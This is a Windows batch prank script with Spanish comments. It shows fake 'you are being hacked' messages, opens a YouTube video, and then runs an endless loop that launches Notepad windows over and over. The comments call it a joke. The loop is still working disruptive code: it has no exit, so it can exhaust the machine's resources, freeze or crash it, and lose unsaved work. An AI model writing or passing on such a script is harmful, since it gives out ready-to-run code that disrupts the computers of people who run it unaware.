@echo off
:: Mostrar mensaje de "hackeo"
echo Atencion, Estas a punto de ser hackeado...

:: Esperar 3 segundos para generar suspenso
timeout /t 3 /nobreak >nul

:: Mostrar mensaje final indicando que es una broma
echo Ya no puedes hacer nada

:: Esperar 3 segundos para generar suspenso
timeout /t 3 /nobreak >nul

start https://www.youtube.com/watch?v=8kQZHYbZkLs

@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top

:: Terminar el script
exit
